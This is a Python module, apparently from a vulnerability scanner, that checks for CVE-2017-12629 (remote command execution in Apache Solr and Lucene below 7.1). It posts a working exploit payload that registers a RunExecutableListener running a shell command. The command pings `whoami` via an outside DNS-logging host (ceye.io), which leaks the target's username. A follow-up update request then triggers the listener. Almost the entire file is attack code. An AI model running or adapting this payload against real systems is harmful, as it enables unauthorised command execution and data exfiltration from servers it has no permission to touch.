#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2017_12629_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-12629漏洞',
            'description': 'CVE-2017-12629漏洞可执行任意命令,影响范围为: Apache Solr < 7.1, Apache Lucene < 7.1',
            'date': '2017-08-07',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.headers1 = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/json'
        }
        self.capta = get_capta()
        self.config_payload = '''{"add-listener":{"event":"postCommit","name":"zxlss3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `whoami`.ip.port.lujuii.ceye.io"]}}'''
        self.update_payload = '''[{"id":"test"}]'''

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        config_url = self.url + '/solr/demo/config'
        update_url = self.url + '/solr/demo/update'
        try:
            config_req = await request.post(config_url, headers = self.headers, data = self.config_payload, )
            config_req_result = await config_req.json()
            if config_req_result['responseHeader']['status'] == 0:
                update_req = await request.post(update_url, headers = self.headers1, data = self.update_payload)
                update_req_result = await update_req.json()
                if update_req_result['responseHeader']['status'] == 0:
                    return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    CVE_2017_12629 = CVE_2017_12629_BaseVerify('http://127.0.0.1:8983')
    CVE_2017_12629.check()